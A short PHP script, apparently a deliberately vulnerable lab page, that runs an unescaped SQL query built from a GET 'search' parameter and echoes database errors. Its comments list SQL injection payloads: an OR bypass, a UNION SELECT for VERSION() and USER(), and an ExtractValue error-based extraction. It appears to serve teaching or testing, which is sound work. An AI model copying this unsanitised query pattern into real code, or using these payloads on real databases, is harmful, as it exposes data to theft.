<?php
// import credentials
include('../mysql_credentials.php');

// Open SQL Server connection
$con = new mysqli($mysql_server, $mysql_user, $mysql_pass, $mysql_db);

// Check for SQL error
if ($con->connect_error) die ("Connection failed: " .$con->connect_error);

$search = $_GET['search'];

$query = "SELECT * FROM items WHERE name='$search'";
# $search = ' OR 1 LIMIT 1,1 -- - 
# $search = ' UNION ALL SELECT VERSION(), USER() -- - 
# $search = ' AND ExtractValue(0, CONCAT( 0x5c, USER() ) ) -- - 
# $query = "SELECT * FROM items WHERE name='' UNION ALL SELECT VERSION(), USER();

$result = $con->query($query);
echo $con->error;

$row = $result->fetch_assoc();
$name = $row["name"];
$price = $row["price"];
echo " - $name   $price.00 € <br/>";

$con->close();
